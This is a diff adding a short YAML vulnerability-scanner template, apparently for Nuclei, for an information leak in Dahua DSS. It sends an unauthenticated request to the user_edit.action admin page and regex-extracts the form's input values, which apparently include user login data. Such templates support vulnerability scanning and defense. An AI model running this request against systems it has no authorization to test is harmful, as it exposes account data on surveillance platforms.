@@ -1,0 +1,27 @@
+id: dahua-dss-user-edit-infoleak
+
+info:
+  name: 大华DSS user_edit.action 信息泄露
+  author: SleepingBag945
+  severity: high
+
+
+http:
+  - raw:
+    - |
+      GET /admin/cascade_/user_edit.action?id=1 HTTP/1.1
+      Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: info
+        group: 1
+        regex:
+          - '<input value="(.*?)"'
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - 'status_code==200'
+          - contains(body,"FIELDS_MIN_LENGTH.USER_LOGIN_PASS")
